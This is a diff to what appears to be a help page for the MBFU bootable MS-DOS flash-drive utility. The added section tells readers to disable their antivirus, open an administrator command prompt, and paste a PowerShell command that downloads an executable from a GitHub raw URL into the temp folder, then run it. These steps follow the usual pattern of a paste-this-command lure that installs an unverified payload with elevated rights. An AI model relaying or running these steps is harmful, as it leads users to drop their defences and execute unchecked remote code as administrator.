@@ -11,3 +11,18 @@ To boot from a bootable MS-DOS flash drive created in MS-DOS BOOT FROM USB, on c
 
 You can download the utility here: https://sementsul.ru/?getsoft=lo72b6347
 The official page of the program: http://sementsul.ru/
+
+
+Launching MBFU without preliminary download, method for win8 and above
+Actions:
+1) Disable antivirus(es)
+2) Run the command line as administrator.
+3) Enter the first command in the terminal:
+powershell -command "(New-Object Net.WebClient).DownloadFile(' https://github.com/ctv-software/webdos622/raw/main/MBFU-BETA-UP.exe ', '%temp%\MBFU-BETA-UP.exe')"
+
+and press Enter, wait for the process to complete.
+4) Paste the second command into the terminal:
+%temp%\MBFU-BETA-UP.exe
+
+and press Enter, wait for the process to complete.
+Then the MBFU interface will open for you
